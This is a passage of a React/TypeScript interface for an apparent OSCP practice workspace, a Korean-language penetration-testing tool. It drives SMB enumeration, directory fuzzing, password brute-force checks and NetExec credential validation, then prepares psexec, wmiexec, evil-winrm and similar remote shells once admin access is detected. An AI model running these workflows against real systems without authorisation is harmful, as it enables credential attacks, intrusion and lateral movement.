    qc.invalidateQueries({ queryKey: ["services", targetId] });
  };
  const missingTools =
    status.data?.tools?.filter((x: any) => !x.installed) || [];
  const runElapsed = runState
    ? Math.max(0, Math.floor((clock - runState.startedAt) / 1000))
    : 0;
  const currentOutcome = runState && !["starting", "running"].includes(runState.status)
    ? summarizeExecutionResult(
        runState.templateId, runState.status, runState.stdout,
        runState.stderr,
        serviceExecutions.find((item) => item.id === runState.id)?.command,
      )
    : null;
  const selectedOutcome = selectedExecution && executionDetail
    ? summarizeExecutionResult(
        selectedExecution.template_id, executionDetail.status,
        executionDetail.stdout, executionDetail.stderr, selectedExecution.command,
      )
    : null;
  const serviceNameLower = (service?.name || "").toLowerCase();
  const netexecProtocol:
    "smb" | "ssh" | "winrm" | "rdp" | "mssql" | "ldap" | undefined =
    ["microsoft-ds", "netbios-ssn", "smb"].includes(serviceNameLower) ? "smb"
    : serviceNameLower === "ssh" ? "ssh"
    : ["wsman", "wsmans", "winrm"].includes(serviceNameLower) ? "winrm"
    : serviceNameLower === "ms-wbt-server" ? "rdp"
    : serviceNameLower === "ms-sql-s" ? "mssql"
    : ["ldap", "ldaps"].includes(serviceNameLower) ? "ldap"
    : undefined;
  const netexecCredCommandId = netexecProtocol && ({
    smb: "smb-credential-check-netexec", ssh: "ssh-credential-check-netexec",
    winrm: "winrm-credential-check-netexec", rdp: "rdp-credential-check-netexec",
    mssql: "mssql-credential-check-netexec", ldap: "ldap-credential-check-netexec",
  } as const)[netexecProtocol];
  const netexecCredentialResult = netexecCredCommandId
    && runState?.templateId === netexecCredCommandId ? runState : undefined;
  const netexecSuccess = netexecCredentialResult?.status === "completed"
    && /^\[\+\]|pwn3d/im.test(netexecCredentialResult.stdout || "");
  const netexecPwned = netexecProtocol === "smb" && netexecSuccess
    && /pwn3d/i.test(netexecCredentialResult?.stdout || "");
  const netexecSshOk = netexecProtocol === "ssh" && netexecSuccess;
  const netexecWinrmOk = netexecProtocol === "winrm" && netexecSuccess;
  const netexecRdpOk = netexecProtocol === "rdp" && netexecSuccess;
  const netexecMssqlOk = netexecProtocol === "mssql" && netexecSuccess;
  const latestSmbSpider = serviceExecutions
    .filter((item) => item.template_id === "smb-share-spider" && item.status === "completed")
    .sort((a, b) => b.id - a.id)[0];
  const smbSpiderOutput = runState?.templateId === "smb-share-spider"
    ? runState.stdout || "" : latestSmbSpider?.stdout || "";
  const smbFiles = lastSpiderShare ? parseSmbFiles(smbSpiderOutput) : [];
  const fuzzRunState = runState?.templateId === "http-directory-fuzz" ? runState : undefined;
  const latestFuzz = serviceExecutions
    .filter((item) => item.template_id === "http-directory-fuzz" && item.status === "completed")
    .sort((a, b) => b.id - a.id)[0];
  const fuzzOutput = fuzzRunState?.stdout || latestFuzz?.stdout || "";
  const fuzzResults = parseFeroxbusterResults(fuzzOutput);
  const fuzzVisible = fuzzResults.filter((item) => !fuzzFilter
    || `${item.path} ${item.status}`.toLowerCase().includes(fuzzFilter.toLowerCase()));
  const latestSmbEnum = serviceExecutions
    .filter((item) => item.template_id === "smb-enum" && item.status === "completed")
    .sort((a, b) => b.id - a.id)[0];
  const smbOutput = selectedExecution?.template_id === "smb-enum"
    ? executionDetail?.stdout || ""
    : runState?.templateId === "smb-enum"
      ? runState.stdout || ""
      : latestSmbEnum?.stdout || "";
  const smbShares = parseSmbShares(smbOutput);
  const smbShareKey = smbShares.map((share) => `${share.name}:${share.type}`).join("|");
  useEffect(() => {
    if (!smbShareKey) return;
    requestAnimationFrame(() => smbResultsRef.current?.scrollIntoView({
      behavior: "smooth", block: "start",
    }));
  }, [smbShareKey]);
  return (
    <div className="app">
      <header>
        <div className="brand">
          <span className="mark">OW</span>
          <div>
            <b>OSCP Workspace</b>
            <small>로컬 Enumeration 작업 공간</small>
          </div>
        </div>
        <div className="target">
          <span>프로젝트</span>
          <b>{project?.name || "프로젝트 없음"}</b>
          <i>/</i>
          <span>대상</span>
          <b>{target?.ip || "—"}</b>
        </div>
        <VpnControl />
      </header>
      <nav>
        <button onClick={() => createProject.mutate()}>＋ 프로젝트</button>
        <select
          value={projectId || ""}
          onChange={(e) => {
            const id = Number(e.target.value);
            setProjectId(id);
            localStorage.setItem("oscp-workspace-project", String(id));
            dispatchEvent(new CustomEvent("oscp-project-change", {detail: id}));
          }}
        >
          <option value="">프로젝트 선택</option>
          {projects.data?.map((p) => (
            <option key={p.id} value={p.id}>
              {p.name}
            </option>
          ))}
        </select>
        <button disabled={!projectId} onClick={() => createTarget.mutate()}>
          ＋ 대상
        </button>
        <select
          value={targetId || ""}
          onChange={(e) => setTargetId(+e.target.value)}
        >
          <option value="">대상 선택</option>
          {targets.data?.map((t) => (
            <option key={t.id} value={t.id}>
              {t.name} · {t.ip}
            </option>
          ))}
        </select>
        <label className="upload">
          Nmap XML 가져오기
          <input
            type="file"
            accept=".xml"
            onChange={(e) => e.target.files?.[0] && upload(e.target.files[0])}
          />
        </label>
        <span
          className="tools"
          title={missingTools.map((item: any) => item.install).join("\n")}
        >
          {status.isLoading
            ? "도구 상태 확인 중"
            : missingTools.length
              ? `미설치: ${missingTools.map((item: any) => item.name).join(", ")}`
              : "필수 도구 설치됨"}
        </span>
      </nav>
      <main
        className="enumerationLayout"
        style={{
          "--services-width": `${servicesCollapsed ? 48 : servicesWidth}px`,
          "--notes-width": `${notesCollapsed ? 48 : notesWidth}px`,
        } as CSSProperties}
      >
        <aside className={`services${servicesCollapsed ? " isCollapsed" : ""}`}>
          <button
            className="panelDockToggle panelDockToggle--services"
            type="button"
            aria-label={servicesCollapsed ? "서비스 목록 펼치기" : "서비스 목록 접기"}
            aria-expanded={!servicesCollapsed}
            title={servicesCollapsed ? "서비스 목록 펼치기" : "서비스 목록 접기"}
            onClick={() => setServicesCollapsed((collapsed) => {
              localStorage.setItem("oscp-services-panel-collapsed", String(!collapsed));
              return !collapsed;
            })}
          >{servicesCollapsed ? "›" : "‹"}</button>
          <div className="panelTitle">
            <span>서비스</span>
            <em>{services.data?.length || 0}개 열림</em>
          </div>
          {services.data?.map((s) => (
            <button
              className={s.id === serviceId ? "active" : ""}
              key={s.id}
              onClick={() => {
                setServiceId(s.id);
                workRef.current?.scrollTo({ top: 0, behavior: "smooth" });
              }}
            >
              <strong>{s.port}</strong>
              <span>
                {s.name.toUpperCase()}
                <small>
                  {[s.product, s.version].filter(Boolean).join(" ") ||
                    "제품·버전 미식별"}
                </small>
              </span>
              <i>{s.protocol}</i>
            </button>
          ))}
          {!services.data?.length && (
            <div className="empty">
              서비스 목록을 채우려면 Nmap XML 스캔을 가져오세요.
            </div>
          )}
          {!servicesCollapsed && <div
            className="layoutResizeHandle servicesResizeHandle"
            role="separator"
            aria-label="서비스 목록 너비 조절"
            aria-orientation="vertical"
            aria-valuemin={180}
            aria-valuemax={420}
            aria-valuenow={servicesWidth}
            title="드래그하거나 마우스 휠·방향키로 너비 조절"
            tabIndex={0}
            onPointerDown={beginServicesResize}
            onPointerMove={resizeServices}
            onPointerUp={finishServicesResize}
            onPointerCancel={finishServicesResize}
            onWheel={(event) => {
              event.preventDefault();
              applyServicesWidth(servicesWidth + (event.deltaY < 0 ? 16 : -16));
            }}
            onKeyDown={(event) => {
              if (!["ArrowLeft", "ArrowRight", "Home", "End"].includes(event.key)) return;
              event.preventDefault();
              if (event.key === "Home") applyServicesWidth(180);
              else if (event.key === "End") applyServicesWidth(420);
              else applyServicesWidth(servicesWidth + (event.key === "ArrowRight" ? 16 : -16));
            }}
          />}
        </aside>
        <section className="work" ref={workRef}>
          <div className="serviceHead">
            <div>
              <span>
                {service?.protocol || "tcp"} / {service?.port || "—"}
              </span>
              <h1>{service?.name?.toUpperCase() || "서비스 선택"}</h1>
            </div>
            <div className="risk">수동 확인 필요</div>
          </div>
          {service && (
            <section className="serviceIdentitySummary" aria-label="식별된 서비스 정보">
              <div><span>서비스</span><b>{service.name || "unknown"}</b></div>
              <div><span>제품</span><b>{service.product || "미확인"}</b></div>
              <div><span>버전</span><b>{service.version || "미제공"}</b></div>
              <div><span>TLS</span><b>{service.tls ? "사용" : "미탐지"}</b></div>
              <div className="serviceIdentitySummary__wide">
                <span>CPE</span><b title={serviceCpes.join(", ")}>
                  {serviceCpes.join(", ") || "미확인"}
                </b>
              </div>
            </section>
          )}
          {service && !service.product && !service.version && (
            <div className="warning">
              <b>제품·버전 미확인</b>
            </div>
          )}
          {service&&<ServiceIntelligencePanel data={intelligence.data}
            loading={intelligence.isLoading} error={intelligence.isError}
            onRun={(id)=>{const command=commands.data?.find(item=>item.id===id);
              if(command)reviewCommand(command);}}/>}
          <div className="tabs">
            <b>서비스 대시보드</b>
            <span>스캔 상세</span>
            <span>이력</span>
            <button
              className="credentialShortcut"
              disabled={!authenticationCommands.length}
              onClick={() => credentialAuditRef.current?.scrollIntoView({
                behavior: "smooth",
                block: "start",
              })}
            >
              {service?.name?.toLowerCase() === "ftp"
                ? "익명 로그인 확인"
                : "대입 공격"}
              {authenticationCommands.length
                ? ` (${authenticationCommands.length})`
                : ""}
            </button>
            <button
              disabled={!service}
              onClick={() => {
                if (!service) return;
                localStorage.setItem(
                  "oscp-workspace-exploit-service",
                  String(service.id),
                );
                location.hash = "exploit-research";
              }}
            >
              Exploit 후보 조사
            </button>
          </div>
          {service && (
            <section className="serviceIntel" aria-labelledby="service-intel-title">
              <header>
                <div>
                  <span>선택한 포트 요약</span>
                  <h2 id="service-intel-title">서비스 대시보드</h2>
                </div>
                <strong>
                  {missingCount
                    ? `${missingCount}개 미확인`
                    : "핵심 정보 확인됨"}
                </strong>
              </header>
              <div className="serviceIntel__facts">
                <dl>
                  <div><dt>Target</dt><dd>{target?.ip || "미확인"}</dd></div>
                  <div><dt>Hostname</dt><dd className={!target?.hostname ? "unknown" : ""}>{target?.hostname || "미확인"}</dd></div>
                  <div><dt>운영체제</dt><dd className={!target?.os_guess ? "unknown" : ""}>{target?.os_guess || "미확인"}</dd></div>
                  <div><dt>서비스</dt><dd>{service.name || "unknown"} · {service.port}/{service.protocol}</dd></div>
                  <div><dt>제품</dt><dd className={!service.product ? "unknown" : ""}>{service.product || "미확인"}</dd></div>
                  <div><dt>버전</dt><dd className={!service.version ? "unknown" : ""}>{service.version || "미확인"}</dd></div>
                </dl>
                <div className="serviceIntel__progress">
                  <span>조사 진행</span>
                  <b>{completedChecks}<small>회 완료</small></b>
                  <p>실행 기록 {serviceExecutions.length}개 · 스캔 관찰 {observations.length}개</p>
                </div>
              </div>
              <div className="serviceIntel__lower">
                <section>
                  <h3>미확인 항목</h3>
                  <div className="missingFacts">
                    {!target?.hostname && (
                      <div>
                        <span>Hostname</span>
                        <button
                          className={autoCheckState(["target-hostname-identity"])?.busy
                            ? "isChecking" : ""}
                          disabled={autoCheckState(["target-hostname-identity"])?.busy ||
                            !targetCommands.data}
                          onClick={() => {
                            const command = targetCommands.data?.find(
                              (item) => item.id === "target-hostname-identity",
                            );
                            if (command) reviewCommand(command);
                          }}>
                          {autoCheckState(["target-hostname-identity"])?.content ||
                            "자동 확인하기"}
                        </button>
                      </div>
                    )}
                    {!target?.os_guess && (
                      <div>
                        <span>운영체제</span>
                        <button
                          className={autoCheckState(["target-os-identity"])?.busy
                            ? "isChecking" : ""}
                          disabled={autoCheckState(["target-os-identity"])?.busy ||
                            !targetCommands.data}
                          onClick={() => {
                            const command = targetCommands.data?.find(
                              (item) => item.id === "target-os-identity",
                            );
                            if (command) reviewCommand(command);
                          }}>
                          {autoCheckState(["target-os-identity"])?.content ||
                            "자동 확인하기"}
                        </button>
                      </div>
                    )}
                    {!!missingFacts.length && (() => {
                      const candidates = rankInvestigationCommands(
                        "정확한 버전",
                        commands.data || [],
                      );
                      const state = autoCheckState(candidates.map((item) => item.id));
                      return (
                        <div>
                          <span>{missingFacts.join(" · ")}</span>
                          <button
                            className={state?.busy ? "isChecking" : ""}
                            disabled={state?.busy || !commands.data}
                            onClick={() => {
                              const command = candidates.find((item) =>
                                !serviceExecutions.some((execution) =>
                                  execution.template_id === item.id &&
                                  ["completed", "no_response"].includes(
                                    execution.status,
                                  )))
                                || candidates[0];
                              if (command) reviewCommand(command);
                            }}
                          >
                            {state?.content || "한 번에 확인하기"}
                          </button>
                        </div>
                      );
                    })()}
                    {target?.hostname && target?.os_guess && !missingFacts.length && (
                      <p>현재 표시할 미확인 항목이 없습니다.</p>
                    )}
                  </div>
                </section>
                <section>
                  <h3>스캔에서 수집한 관찰</h3>
                  {observations.length ? observations.map((item) => (
                    <details key={item.id}>
                      <summary>{item.id}</summary>
                      <pre>{item.output}</pre>
                    </details>
                  )) : <p>아직 저장된 NSE 관찰 결과가 없습니다.</p>}
                </section>
                <section>
                  <h3>바로 실행할 확인 명령</h3>
                  <p>전체 명령을 검토한 후 실행하세요.</p>
                  <div>
                    {commands.data
                      ?.filter((item) => [
                        "service-version",
                        "service-version-udp",
                        "telnet-info",
                        "telnet-banner",
                        "telnet-version-trace",
                      ].includes(item.id))
                      .slice(0, 3)
                      .map((item) => (
                        <button key={item.id} onClick={() => {
                          reviewCommand(item);
                        }}>
                          {item.name}
                        </button>
                      ))}
                  </div>
                </section>
              </div>
            </section>
          )}
          {!!authenticationCommands.length && (
            <section ref={credentialAuditRef} className="credentialAudit"
              aria-labelledby="credential-audit-title">
              <header>
                <div>
                  <span>프로토콜별 인증 점검</span>
                  <h2 id="credential-audit-title">{credentialProfile.title}</h2>
                </div>
                <strong>선택한 {service?.name || "서비스"}에만 실행</strong>
              </header>
              <p>
                {credentialProfile.description} 각 작업은 자동 실행되지 않으며
                전체 명령과 잠금 위험을 검토한 뒤 시작됩니다.
              </p>
              <a className="intruderLaunch" href="#web">
                <span>HTTP 요청 후보를 직접 구성하려면</span>
                <b>Web Testing · Intruder 열기 →</b>
              </a>
              <div className="credentialDataset">
                <div>
                  <b>{credentialProfile.identityLabel}</b>
                  <code>{credentialProfile.identities}</code>
                </div>
                <div>
                  <b>{credentialProfile.secretLabel}</b>
                  <code>{credentialProfile.secrets}</code>
                </div>
                <small>
                  {credentialProfile.limits}
                </small>
              </div>
              <div className="credentialActions">
                {authenticationCommands.map((command) => {
                  const commandRun = runState?.templateId === command.id
                    ? runState : undefined;
                  const commandBusy = !!commandRun &&
                    ["starting", "running"].includes(commandRun.status);
                  const auditSummary = commandRun?.status === "completed" &&
                      commandRun.stdout != null
                    ? summarizeCredentialAudit(
                      command.id,
                      commandRun.stdout,
                      commandRun.stderr || "",
                    )
                    : null;
                  const auditOutput = commandRun
                    ? `${commandRun.stdout || ""}${commandRun.stderr || ""}`
                    : "";
                  return <article key={command.id}
                    className={commandBusy ? "isRunning" : ""}
                    aria-busy={commandBusy}>
                    <div>
                      <b>{command.name}</b>
                      <small>{command.description}</small>
                      {commandRun && (
                        <span className={`credentialRun credentialRun--${commandRun.status}`}>
                          <i aria-hidden="true" />
                          {commandBusy
                            ? `${commandRun.status === "starting" ? "실행 준비" : "프로세스 실행 중"} · ${runElapsed}초`
                            : `${statusLabel[commandRun.status] || commandRun.status} · ${runElapsed}초`}
                        </span>
                      )}
                    </div>
                    <span className={`credentialRisk credentialRisk--${command.risk}`}>
                      {command.risk === "high" ? "잠금 위험" : "노출 확인"}
                    </span>
                    <button disabled={commandBusy}
                      onClick={() => reviewCommand(command)}>
                      {commandBusy ? "대입 중…" : "대입 공격 검토·실행"}
                    </button>
                    {auditSummary && (
                      <section className={`credentialResult credentialResult--${auditSummary.status}`}>
                        <b>{auditSummary.label}</b>
                        <details>
                          <summary>검사 원문 보기</summary>
                          <pre>{auditOutput ||
                            "명령이 출력 없이 완료되었습니다."}</pre>
                        </details>
                      </section>
                    )}
                  </article>;
                })}
              </div>
            </section>
          )}
          <div className="cards">
            {investigationCommands.map((c) => (
              <article
                key={c.id}
                className={runState?.templateId === c.id ? "isRunning" : ""}
              >
                <div>
                  {runState && runState.templateId === c.id ? (
                    <span className={`commandStatus commandStatus--${runState.status}`}>
                      {statusLabel[runState.status] || (
                        runState.status === "starting" ? "실행 준비 중" : runState.status
                      )}
                    </span>
                  ) : (
                    <span className="badge">
                      위험: {riskLabel[c.risk] || c.risk}
                    </span>
                  )}
                  <h3>{c.name}</h3>
                  <p>{c.description}</p>
                </div>
                <code>{c.preview}</code>
                <div className="actions">
                  <button
                    onClick={() => navigator.clipboard.writeText(c.preview)}
                  >
                    복사
                  </button>
                  <button
                    className="primary"
                    disabled={!!runState && runState.templateId === c.id &&
                      ["starting", "running"].includes(runState.status)}
                    onClick={() => {
                      reviewCommand(c);
                    }}
                  >
                    {runState && runState.templateId === c.id &&
                    ["starting", "running"].includes(runState.status)
                      ? `실행 중 · ${runElapsed}초`
                      : "검토 후 실행 →"}
                  </button>
                </div>
              </article>
            ))}
            {!investigationCommands.length && (
              <p className="investigationEmpty">
                이미 확인된 항목을 제외하면 실행할 명령이 없습니다.
              </p>
            )}
          </div>
          {service && authContextNotice[service.name] && (
            <div className="identityNotice" role="note">
              <b>이 프로토콜은 추가 인증 문맥이 필요합니다</b>
              <p>{authContextNotice[service.name]}</p>
            </div>
          )}
          {guidance && (
            <section className="manualGuidance" aria-labelledby="manual-guidance-title">
              <div>
                <span>수동 상호작용 안내</span>
                <h2 id="manual-guidance-title">{guidance.title}</h2>
                <p>
                  대화형 명령은 Kali의 실제 데스크톱 터미널에서 실행됩니다.
                  계정 후보는 복사한 뒤 터미널에서 직접 입력하세요.
                </p>
              </div>
              <code>{guidance.command}</code>
              <button
                onClick={() => navigator.clipboard.writeText(guidance.command)}
              >
                접속 명령 복사
              </button>
              <ol>
                {guidance.steps.map((step) => <li key={step}>{step}</li>)}
              </ol>
              <div className="accountCandidates" aria-label="정적 계정 후보">
                <b>로그인 계정 입력</b>
                {guidance.accountCandidates.map((account) => (
                  <button
                    key={account}
                    onClick={() => navigator.clipboard.writeText(account)}
                  >
                    {account} 복사
                  </button>
                ))}
              </div>
              {guidance.verificationCommands?.length && (
                <div className="verificationCommands">
                  <b>로그인 후 버전 확인 명령</b>
                  <p>대상 셸에 로그인한 뒤 운영체제에 맞는 명령 하나를 직접 실행하세요.</p>
                  {guidance.verificationCommands.map((command) => (
                    <div key={command}>
                      <code>{command}</code>
                      <button
                        onClick={() => navigator.clipboard.writeText(command)}
                      >
                        복사
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </section>
          )}
          {runState && (
            <section
              className={`jobStatus jobStatus--${runState.status}`}
              aria-live="polite"
              aria-label="현재 명령 실행 상태"
            >
              <span className="jobStatus__dot" aria-hidden="true" />
              <div>
                <b>
                  작업 #{runState.id || "준비"} ·{" "}
                  {statusLabel[runState.status] || runState.status}
                </b>
                <small>
                  {runState.status === "starting" && "실행 요청을 준비하고 있습니다."}
                  {runState.status === "running" &&
                    (runProcessAlive
                      ? "백엔드가 명령 프로세스 실행을 확인했습니다."
                      : "명령을 실행했으며 다음 상태 신호를 기다리고 있습니다.")}
                  {runState.status === "completed" && "명령 실행과 결과 저장이 완료되었습니다."}
                  {runState.status === "no_response" && "대상 응답 또는 식별 결과가 없습니다."}
                  {["failed", "error"].includes(runState.status) &&
                    (runState.message || "명령 실행에 실패했습니다.")}
                  {runState.status === "stopped" && "명령 실행이 중단되었습니다."}
                </small>
              </div>
              <dl>
                <div>
                  <dt>경과 시간</dt>
                  <dd>{runElapsed < 60
                    ? `${runElapsed}s`
                    : `${Math.floor(runElapsed / 60)}m ${runElapsed % 60}s`}</dd>
                </div>
                <div>
                  <dt>프로세스</dt>
                  <dd>{runState.status === "running"
                    ? runProcessAlive ? "실행 확인됨" : "확인 중"
                    : "종료됨"}</dd>
                </div>
                <div>
                  <dt>마지막 서버 응답</dt>
                  <dd>{lastRunEventAt
                    ? `${Math.max(0, Math.floor((clock - lastRunEventAt) / 1000))}초 전`
                    : "대기 중"}</dd>
                </div>
              </dl>
              {runState.status === "running" && lastRunEventAt &&
                clock - lastRunEventAt > 30000 && (
                  <p className="jobStatus__warning" role="alert">
                    30초 이상 서버 상태 신호가 없습니다. 백엔드 연결을 확인하세요.
                  </p>
                )}
            </section>
          )}
          {smbShares.length > 0 && (
            <section ref={smbResultsRef} className="smbShareResults"
              aria-labelledby="smb-shares-title">
              <header>
                <div>
                  <span>익명 열거 결과</span>
                  <h2 id="smb-shares-title">SMB 공유 {smbShares.length}개</h2>
                </div>
                <small>Disk 공유는 아래에서 바로 접속할 수 있습니다.</small>
              </header>
              <div className="smbShareTable" role="table" aria-label="SMB 공유 목록">
                <div role="row" className="smbShareHead">
                  <span role="columnheader">공유 이름</span>
                  <span role="columnheader">형식</span>
                  <span role="columnheader">설명</span>
                  <span role="columnheader">작업</span>
                </div>
                {smbShares.map((share) => (
                  <div role="row" key={`${share.name}-${share.type}`}>
                    <b role="cell">{share.name}</b>
                    <span role="cell">{share.type}</span>
                    <span role="cell">{share.comment || "—"}</span>
                    <span role="cell" className="smbShareAction">
                      <button
                        disabled={share.type.toLowerCase() !== "disk"
                          || smbConnecting === share.name}
                        onClick={() => connectSmbShare(share.name)}
                      >
                        {smbConnecting === share.name ? "여는 중…" : "접속"}
                      </button>
                      <button
                        disabled={share.type.toLowerCase() !== "disk"}
                        title="smbclient recurse ON; ls로 이 공유의 파일을 재귀적으로 나열합니다."
                        onClick={() => spiderSmbShare(share.name)}
                      >
                        재귀 목록
                      </button>
                    </span>
                  </div>
                ))}
              </div>
              {smbConnectError && (
                <p className="smbConnectError" role="alert">{smbConnectError}</p>
              )}
              {!!smbFiles.length && (
                <div className="smbFileList">
                  <b>{lastSpiderShare} 재귀 목록 · 파일 {smbFiles.length}개</b>
                  {smbFiles.map((file) => (
                    <div key={file.path} className="smbFileRow">
                      <code>{file.path}</code>
                      <span>{file.size}B</span>
                      <button onClick={() => viewSmbFile(file.path)}>원문 보기</button>
                    </div>
                  ))}
                </div>
              )}
            </section>
          )}
          {["http", "https", "http-proxy", "ssl/http"].includes(serviceNameLower) && (
            <section className="netexecCredCheck" aria-labelledby="fuzz-heading">
              <header>
                <h2 id="fuzz-heading">디렉터리·파일 퍼징 (feroxbuster)</h2>
                <small>정적 워드리스트로 존재하는 경로만 찾습니다. 재귀 탐색은 하지 않습니다.</small>
              </header>
              <div className="netexecCredForm netexecCredForm--save">
                <select value={fuzzWordlist} onChange={(e) => setFuzzWordlist(e.target.value)}>
                  <option value="/usr/share/wordlists/dirb/small.txt">dirb small (~950개)</option>
                  <option value="/usr/share/wordlists/dirb/common.txt">dirb common (~4,600개)</option>
                  <option value="/usr/share/wordlists/dirb/big.txt">dirb big (~2만개)</option>
                </select>
                <button disabled={!!fuzzRunState
                  && ["starting", "running"].includes(fuzzRunState.status)}
                  onClick={runDirectoryFuzz}>
                  {fuzzRunState && ["starting", "running"].includes(fuzzRunState.status)
                    ? "탐색 중…" : "퍼징 시작"}
                </button>
              </div>
              {!!fuzzResults.length && (
                <div className="intruderResults">
                  <header><div><b>발견된 경로</b><span>{fuzzVisible.length}개 표시</span></div>
                    <input aria-label="결과 필터" value={fuzzFilter} placeholder="경로, Status 필터"
                      onChange={(e) => setFuzzFilter(e.target.value)} />
                    {(fuzzRunState?.id || latestFuzz?.id) && (
                      <button onClick={() => {
                        const ex = fuzzRunState?.id
                          ? {id: fuzzRunState.id, stdout: fuzzRunState.stdout,
                             stderr: fuzzRunState.stderr}
                          : {id: latestFuzz.id, stdout: latestFuzz.stdout,
                             stderr: latestFuzz.stderr};
                        void captureEvidence(ex, `디렉터리 퍼징 · ${target?.ip}:${service?.port}`);
                      }}>Evidence로 저장</button>
                    )}
                  </header>
                  {evidenceMsg && <p className="netexecEvidenceMsg">{evidenceMsg}</p>}
                  <table>
                    <thead><tr><th>경로</th><th>Status</th><th>길이</th><th>단어/줄</th><th></th></tr></thead>
                    <tbody>{fuzzVisible.map((item) => (
                      <tr key={item.path}>
                        <td><code>{item.path}</code></td>
                        <td>{item.status}</td>
                        <td>{item.length}</td>
                        <td>{item.words}/{item.lines}</td>
                        <td><a href={`${serviceNameLower.includes("ssl") ? "https" : "http"}` +
                          `://${target?.ip}:${service?.port}${item.path}`}
                          target="_blank" rel="noreferrer">열기</a></td>
                      </tr>
                    ))}</tbody>
                  </table>
                </div>
              )}
            </section>
          )}
          {!!netexecProtocol && (
            <section className="netexecCredCheck"
              aria-labelledby="netexec-cred-heading">
              <header>
                <h2 id="netexec-cred-heading">
                  {netexecProtocol.toUpperCase()} 자격증명 확인 (NetExec)
                </h2>
                <small>대입 공격이 아니라 사용자가 입력한 계정 하나만 검증합니다.</small>
              </header>
              {!!savedCredentials.data?.length && (
                <div className="credStore">
                  {savedCredentials.data.map((item) => (
                    <div key={item.id} className="credStoreRow">
                      <button className="credStoreFill"
                        onClick={() => applySavedCredential(item)}
                        title="이 계정으로 아래 폼을 채웁니다">
                        <b>{item.domain ? `${item.domain}\\` : ""}{item.username}</b>
                        <span>{item.has_secret ? "🔑 비밀번호 저장됨"
                          : item.secret_hint ? `힌트: ${item.secret_hint}` : "비밀번호 미저장"}
                          {item.source_detail ? ` · ${sourceLabel[item.source_kind]
                            || item.source_kind}: ${item.source_detail}`
                            : sourceLabel[item.source_kind]
                              ? ` · ${sourceLabel[item.source_kind]}` : ""}</span>
                      </button>
                      <button className="credStoreDelete"
                        onClick={() => void deleteSavedCredential(item.id)}
                        aria-label="자격증명 삭제">삭제</button>
                    </div>
                  ))}
                </div>
              )}
              <div className="netexecCredForm">
                <input placeholder="도메인 (선택)" value={netexecDomain}
                  onChange={(e) => setNetexecDomain(e.target.value)} />
                <input placeholder="사용자명" value={netexecUsername}
                  onChange={(e) => setNetexecUsername(e.target.value)} />
                <input type="password" placeholder="비밀번호" value={netexecPassword}
                  onChange={(e) => setNetexecPassword(e.target.value)} />
                <button disabled={!netexecUsername.trim()
                  || (!!netexecCredentialResult
                    && ["starting", "running"].includes(netexecCredentialResult.status))}
                  onClick={checkNetexecCredential}>
                  {netexecCredentialResult
                    && ["starting", "running"].includes(netexecCredentialResult.status)
                    ? "확인 중…" : "NetExec으로 확인"}
                </button>
              </div>
              <div className="credSaveBox">
                <div className="netexecCredForm netexecCredForm--save">
                  <input placeholder="비밀번호 힌트 (선택)"
                    value={netexecHint} onChange={(e) => setNetexecHint(e.target.value)} />
                  <button disabled={!netexecUsername.trim() || netexecSaving}
                    onClick={() => void saveNetexecCredential()}>
                    {netexecSaving ? "저장 중…" : "Credential Store에 저장"}
                  </button>
                </div>
                <div className="credProvenance">
                  <label>출처
                    <select value={netexecSourceKind}
                      onChange={(e) => setNetexecSourceKind(e.target.value)}>
                      <option value="manual">직접 입력</option>
                      <option value="share-file">공유 파일</option>
                      <option value="web">웹</option>
                      <option value="config">설정 파일</option>
                      <option value="kerberoast">Kerberoast 크랙</option>
                      <option value="reuse">재사용</option>
                      <option value="other">기타</option>
                    </select>
                  </label>
                  <input placeholder="출처 상세 (예: WorkShares/config.ini 12번째 줄)"
                    value={netexecSourceDetail}
                    onChange={(e) => setNetexecSourceDetail(e.target.value)} />
                  <label className="credStoreSecretToggle">
                    <input type="checkbox" checked={netexecStoreSecret}
                      onChange={(e) => setNetexecStoreSecret(e.target.checked)} />
                    실제 비밀번호도 로컬에 저장 (재사용·명령 자동채움용)
                  </label>
                </div>
              </div>
              {netexecPwned && (
                <div className="netexecPwned">
                  <b>로컬 관리자 권한 확인됨 (Pwn3d!)</b>
                  <span>원문 출력은 실행 이력에서 확인하세요. 아래 버튼들은 같은 계정으로
                    impacket 명령을 데스크톱 셸에 입력만 해둡니다 — 대상과 명령을 다시
                    확인한 뒤 직접 Enter를 눌러야 실행됩니다. 하나가 막히면 다른 걸
                    시도하세요.</span>
                  <div className="netexecPwnedActions">
                    <button onClick={() => void openPsexecShell()}>psexec</button>
                    <button onClick={() => void openLateralShell("wmiexec")}>wmiexec</button>
                    <button onClick={() => void openLateralShell("smbexec")}>smbexec</button>
                    <button onClick={() => void openLateralShell("atexec")}>atexec</button>
                  </div>
                </div>
              )}
              {netexecSshOk && (
                <div className="netexecPwned">
                  <b>SSH 인증 성공</b>
                  <span>원문 출력은 실행 이력에서 확인하세요. 아래 버튼은 순수 셸을 열고
                    ssh 명령을 입력만 해둡니다 — 대상을 다시 확인한 뒤 직접 Enter를
                    누르고, 프롬프트가 뜨면 위에 입력한 비밀번호를 직접 입력하세요.</span>
                  <button onClick={() => void openSshShell()}>SSH 명령 준비하기</button>
                </div>
              )}
              {netexecWinrmOk && (
                <div className="netexecPwned">
                  <b>WinRM 인증 성공</b>
                  <span>원문 출력은 실행 이력에서 확인하세요. 아래 버튼은 순수 셸을 열고
                    evil-winrm 명령을 입력만 해둡니다 — 대상과 계정을 다시 확인한 뒤
                    직접 Enter를 눌러야 실행됩니다.</span>
                  <button onClick={() => void openEvilWinrmShell()}>
                    evil-winrm 명령 준비하기
                  </button>
                </div>
              )}
              {netexecRdpOk && (
                <div className="netexecPwned">
                  <b>RDP 인증 성공</b>
                  <span>RDP는 GUI라 이 앱 안에서 열 수 없습니다. 아래 버튼은 xfreerdp
                    명령을 클립보드에 복사해둘 뿐이며, 직접 터미널에서 확인 후 붙여넣어
                    실행해야 합니다.</span>
                  <button onClick={() => void copyXfreerdpCommand()}>
                    xfreerdp 명령 복사
                  </button>
                </div>
              )}
              {netexecMssqlOk && (
                <div className="netexecPwned">
                  <b>MS SQL 인증 성공</b>
                  <span>원문 출력은 실행 이력에서 확인하세요. 아래 버튼은 순수 셸을 열고
                    impacket-mssqlclient 명령을 입력만 해둡니다 — 대상과 계정을 다시
                    확인한 뒤 직접 Enter를 눌러야 실행됩니다.</span>
                  <button onClick={() => void openMssqlShell()}>
                    impacket-mssqlclient 명령 준비하기
                  </button>
                </div>
              )}
              {netexecProtocol === "ldap" && (
                <div className="netexecPwnedActions" style={{marginTop: "12px"}}>
